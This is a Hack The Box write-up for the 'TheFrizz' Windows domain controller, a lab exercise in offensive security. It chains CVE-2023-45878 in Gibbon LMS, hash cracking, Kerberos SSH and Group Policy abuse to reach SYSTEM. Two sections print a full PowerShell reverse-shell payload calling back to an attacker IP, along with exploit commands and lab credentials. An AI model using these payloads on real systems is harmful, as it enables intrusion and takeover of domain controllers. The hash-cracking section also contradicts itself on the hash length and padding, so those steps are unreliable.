# HTB Write-Up: TheFrizz

| Field      | Details                                                              |
|------------|----------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/TheFrizz)         |
| Difficulty | Medium                                                               |
| OS         | Windows                                                              |
| Author     | 0xPizzaCat                                                           |
| Date       | June 7, 2026                                                         |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Gibbon LMS](#2-enumeration--gibbon-lms)
3. [Initial Access — CVE-2023-45878](#3-initial-access--cve-2023-45878)
4. [Foothold — MySQL & Password Cracking](#4-foothold--mysql--password-cracking)
5. [User Shell — Kerberos SSH](#5-user-shell--kerberos-ssh)
6. [Privilege Escalation — Recycling Bin & GPO Abuse](#6-privilege-escalation--recycling-bin--gpo-abuse)
7. [Summary](#7-summary)

---

## 1. Reconnaissance

Port scanning with Nmap revealed a Windows Active Directory domain controller:

```bash
nmap -A 10.129.10.36
```

**Open Ports:**

| Port | Service | Details |
|------|---------|---------|
| 22   | SSH     | OpenSSH for Windows 9.5 |
| 53   | DNS     | Simple DNS Plus |
| 80   | HTTP    | Apache 2.4.58 — PHP 8.2.12 |
| 88   | Kerberos | Microsoft Windows Kerberos |
| 389  | LDAP    | Active Directory — frizz.htb |
| 445  | SMB     | Message signing enabled, NTLM disabled |

The HTTP server redirected to `http://frizzdc.frizz.htb/home/`, revealing the domain name. Both hostnames were added to `/etc/hosts`:

```bash
echo "10.129.10.36 frizz.htb frizzdc.frizz.htb" >> /etc/hosts
```

Notable from the scan: SMB signing is required and NTLM is disabled (`NTLM:False`), meaning password spray attacks over SMB will not work — Kerberos is the only authentication path.

---

## 2. Enumeration — Gibbon LMS

Browsing to `http://frizzdc.frizz.htb` revealed a web application for **Walkerville Elementary School**. The Staff Login button redirected to a **Gibbon-LMS** instance at `/Gibbon-LMS/`.

```bash
curl http://frizzdc.frizz.htb/Gibbon-LMS/ | grep -i version
```

The page footer disclosed the version: **Gibbon v25.0.0**.

---

## 3. Initial Access — CVE-2023-45878

Gibbon v25.0.0 is vulnerable to **unauthenticated arbitrary file write** (CVE-2023-45878), which can be used to write a PHP webshell and achieve remote code execution.

```bash
git clone https://github.com/davidzzo23/CVE-2023-45878.git
cd CVE-2023-45878
```

Verify the target is vulnerable:

```bash
python3 CVE-2023-45878.py -t frizzdc.frizz.htb -c "whoami"
# Output: frizz\w.webservice
```

Generate a base64-encoded PowerShell reverse shell payload:

```python
import base64
cmd = '$client = New-Object System.Net.Sockets.TCPClient("10.10.15.24",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
```

Start a listener and trigger the shell:

```bash
nc -lvvp 4444

python3 CVE-2023-45878.py -t frizzdc.frizz.htb -c "powershell -e <BASE64_PAYLOAD>"
```

A reverse shell as `frizz\w.webservice` is returned.

---

## 4. Foothold — MySQL & Password Cracking

### 4.1 — Database Credentials from Config

Enumerating the web root reveals the Gibbon-LMS configuration file:

```powershell
type C:\xampp\htdocs\Gibbon-LMS\config.php
```

The file contains plaintext MySQL credentials:

```php
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
```

### 4.2 — Extracting the Hash from MySQL

Using the MySQL binary from the XAMPP installation with the `-e` flag to run a non-interactive query:

```cmd
c:\xampp\mysql\bin\mysql.exe -uMrGibbonsDB -pMisterGibbs!Parrot!?1 gibbon -e "select username, passwordStrong, passwordStrongSalt from gibbonPerson where username='f.frizzle';"
```

Result:

| username | passwordStrong | passwordStrongSalt |
|----------|---------------|-------------------|
| f.frizzle | `067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03` | `/aACFhikmNopqrRTVz2489` |

### 4.3 — Cracking the Hash

Gibbon uses `sha256($salt.$pass)` — Hashcat mode **1420**. The hash from MySQL is missing a leading zero (63 chars instead of 64), which must be verified:

```bash
echo -n "067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03" | wc -c
# 63 — pad with leading zero
```

Build the hash file and crack:

```bash
python3 -c "h='067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03'; print(h.zfill(64))"
# 0067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03

echo "067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489" > hash.txt

hashcat -m 1420 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `f.frizzle` : `Jenni_Luvs_Magic23`

---

## 5. User Shell — Kerberos SSH

The SSH server only accepts GSSAPI/Kerberos authentication (password auth is disabled). NTLM is also disabled on this DC, so a valid Kerberos ticket is required.

### 5.1 — Sync Time

Kerberos is sensitive to clock skew. Sync time with the DC before every TGT request:

```bash
sudo ntpdate frizzdc.frizz.htb
```

### 5.2 — Get a TGT with Impacket

```bash
impacket-getTGT -dc-ip frizzdc.frizz.htb frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'
export KRB5CCNAME=$(pwd)/f.frizzle.ccache
```

### 5.3 — Configure Kerberos

```bash
echo "[libdefaults]
    default_realm = FRIZZ.HTB
[realms]
    FRIZZ.HTB = {
        kdc = frizzdc.frizz.htb
        admin_server = frizzdc.frizz.htb
    }
[domain_realm]
    .frizz.htb = FRIZZ.HTB
    frizz.htb = FRIZZ.HTB" | sudo tee /etc/krb5.conf
```

### 5.4 — SSH via Kerberos

```bash
ssh -K -o GSSAPIAuthentication=yes f.frizzle@frizzdc.frizz.htb
```

**User flag:** `C:\Users\f.frizzle\Desktop\user.txt`

---

## 6. Privilege Escalation — Recycling Bin & GPO Abuse

### 6.1 — Recover 7Zip Archive from Recycle Bin

```powershell
$shell = New-Object -ComObject Shell.Application
$recycleBin = $shell.Namespace(0xA)
$recycleBin.Items() | Select-Object Name, Path
# wapt-backup-sunday.7z

$item = $recycleBin.Items() | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}
$desktop = (New-Object -ComObject Shell.Application).NameSpace([Environment]::GetFolderPath("Desktop"))
$desktop.MoveHere($item)
```

### 6.2 — Transfer and Extract

From the attack machine (after time sync and exporting ccache):

```bash
sudo ntpdate frizzdc.frizz.htb
export KRB5CCNAME=$(pwd)/f.frizzle.ccache
scp -K -o GSSAPIAuthentication=yes f.frizzle@frizzdc.frizz.htb:"C:/Users/f.frizzle/Desktop/wapt-backup-sunday.7z" .
7z x wapt-backup-sunday.7z
```

### 6.3 — Extract M.SchoolBus Credentials

```bash
cd wapt && grep -R 'password'
# conf/waptserver.ini:wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=

echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d | tr -d '\n\r' | rev
# R!deTheM@gicBus!
```

### 6.4 — Authenticate as M.SchoolBus

```bash
sudo ntpdate frizzdc.frizz.htb && \
impacket-getTGT -dc-ip frizzdc.frizz.htb frizz.htb/m.schoolbus:'R!deTheM@gicBus!' && \
export KRB5CCNAME=$(pwd)/m.schoolbus.ccache && \
ssh -K -o GSSAPIAuthentication=yes m.schoolbus@frizzdc.frizz.htb
```

Verify group membership:

```powershell
whoami /groups
# frizz\Group Policy Creator Owners  ← confirmed
```

### 6.5 — GPO Abuse with SharpGPOAbuse

Create and link a malicious GPO to the Domain Controllers OU:

```powershell
New-GPO -Name privesc | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
```

Download and upload SharpGPOAbuse:

```bash
wget https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe
export KRB5CCNAME=$(pwd)/m.schoolbus.ccache
scp -o GSSAPIAuthentication=yes ./SharpGPOAbuse.exe m.schoolbus@frizzdc.frizz.htb:"C:/Users/M.SchoolBus/Desktop/"
```

Generate reverse shell payload:

```python
import base64
cmd = '$client = New-Object System.Net.Sockets.TCPClient("10.10.15.24",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
```

Start a listener, add the scheduled task via GPO, and force refresh:

```bash
nc -lvvp 4444
```

```powershell
.\SharpGPOAbuse.exe --addcomputertask --gponame "privesc" --author TCG --taskname PrivEsc --command "powershell.exe" --arguments "powershell -e <BASE64_PAYLOAD>" --Force

gpupdate /force
```

Shell received as `NT Authority\System`.

**Root flag:** `C:\Users\Administrator\Desktop\root.txt`

---

## 7. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | Nmap scan | Ports 22, 80, 88, 389 — AD DC identified, NTLM disabled |
| Enumeration | Curl + version fingerprint | Gibbon LMS v25.0.0 discovered |
| Initial Access | CVE-2023-45878 unauthenticated file write | RCE as `frizz\w.webservice` |
| Credential Discovery | `config.php` | MySQL creds for `MrGibbonsDB` |
| Hash Extraction | MySQL query on `gibbonPerson` | SHA-256 hash + salt for `f.frizzle` |
| Password Cracking | Hashcat mode 1420 + rockyou.txt | `f.frizzle:Jenni_Luvs_Magic23` |
| User Shell | Impacket getTGT + Kerberos SSH | Shell as `f.frizzle` |
| Lateral Movement | Recycling bin 7zip → WAPT config → base64 decode + reverse | `m.schoolbus:R!deTheM@gicBus!` |
| Privilege Escalation | GPO creation + SharpGPOAbuse scheduled task | Shell as `NT Authority\System` |

### Key Takeaways

- **Clock skew is critical for Kerberos.** Every `getTGT` call must be preceded by `ntpdate` — Kerberos rejects tickets with more than 5 minutes of clock drift, and HTB VMs drift quickly.

- **MySQL dropped a leading zero from the SHA-256 hash.** The stored hash was 63 hex chars instead of 64. Always verify hash length before passing to hashcat — a token length exception is a strong hint.

- **NTLM being disabled forces Kerberos everywhere.** Password spraying over SMB was impossible. All lateral movement required obtaining valid ccache tickets via `impacket-getTGT` first.

- **Recycle bins are goldmines.** Deleted files are often overlooked during enumeration. The WAPT backup archive in the recycling bin contained credentials that enabled the entire privilege escalation chain.

- **Group Policy Creator Owners is a dangerous group.** Members can create GPOs and link them to OUs without being Domain Admins. Combined with SharpGPOAbuse, this is a reliable path to SYSTEM on any Windows AD machine.
